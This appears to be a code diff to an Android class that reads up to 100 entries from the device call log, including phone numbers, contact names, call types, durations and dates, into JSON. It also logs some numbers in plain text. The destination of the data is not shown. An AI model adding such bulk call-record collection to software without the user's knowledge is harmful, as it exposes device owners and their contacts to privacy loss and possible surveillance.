@@ -21,7 +21,7 @@ public class RealCallLogCollector {
         Cursor cursor = null;
         
         try {
-            Log.d(TAG, "📞 Collecting real call logs...");
+            Log.d(TAG, "📞 Collecting REAL call logs from device...");
             
             String[] projection = new String[]{
                 CallLog.Calls.NUMBER,
@@ -36,10 +36,11 @@ public class RealCallLogCollector {
                 projection,
                 null,
                 null,
-                CallLog.Calls.DATE + " DESC LIMIT 50"
+                CallLog.Calls.DATE + " DESC LIMIT 100"
             );
             
             if (cursor != null && cursor.moveToFirst()) {
+                int count = 0;
                 do {
                     String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                     int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
@@ -47,27 +48,36 @@ public class RealCallLogCollector {
                     long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                     String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                     
-                    JSONObject call = new JSONObject();
-                    call.put("number", number != null ? number : "Unknown");
-                    call.put("name", name != null ? name : "Unknown");
-                    call.put("type", getCallType(type));
-                    call.put("duration", duration);
-                    call.put("timestamp", date);
-                    call.put("readable_date", new Date(date).toString());
-                    call.put("duration_minutes", String.format("%d:%02d", duration / 60, duration % 60));
-                    
-                    callLogs.put(call);
-                    Log.d(TAG, "📞 Call: " + number + " - " + getCallType(type) + " - " + duration + "s");
+                    // Only process calls with real numbers
+                    if (number != null && !number.trim().isEmpty()) {
+                        JSONObject call = new JSONObject();
+                        call.put("number", number.trim());
+                        call.put("name", name != null ? name.trim() : "Unknown");
+                        call.put("type", getCallType(type));
+                        call.put("duration", duration);
+                        call.put("timestamp", date);
+                        call.put("readable_date", new Date(date).toString());
+                        call.put("duration_minutes", String.format("%d:%02d", duration / 60, duration % 60));
+                        
+                        callLogs.put(call);
+                        count++;
+                        
+                        if (count <= 5) {
+                            Log.d(TAG, "📞 REAL Call: " + number + " - " + getCallType(type) + " - " + duration + "s");
+                        }
+                    }
                     
                 } while (cursor.moveToNext());
+                
+                Log.d(TAG, "✅ Collected " + count + " REAL call logs from device");
+            } else {
+                Log.w(TAG, "📭 No REAL call logs found in device");
             }
             
-            Log.d(TAG, "✅ Collected " + callLogs.length() + " real call logs");
-            
         } catch (SecurityException e) {
-            Log.e(TAG, "❌ Call log permission denied: " + e.getMessage());
+            Log.e(TAG, "❌ Call log permission denied - NO CALL LOGS DATA COLLECTED: " + e.getMessage());
         } catch (Exception e) {
-            Log.e(TAG, "❌ Error reading call logs: " + e.getMessage());
+            Log.e(TAG, "❌ Error reading REAL call logs: " + e.getMessage());
         } finally {
             if (cursor != null) {
                 cursor.close();
